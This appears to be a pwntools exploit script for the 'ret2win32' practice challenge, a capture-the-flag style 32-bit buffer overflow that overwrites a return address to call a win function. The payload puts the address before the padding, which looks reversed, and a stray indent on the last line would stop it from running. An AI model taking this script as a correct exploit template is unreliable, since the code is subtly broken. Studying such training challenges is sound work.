from pwn import * 

p = process('./ret2win32')
binary = ELF('./ret2win32')

address = p32(0x0804862c)
offset = 0x2c

payload = (address + (offset*b'A'))

p.sendline(payload)
 p.interactive()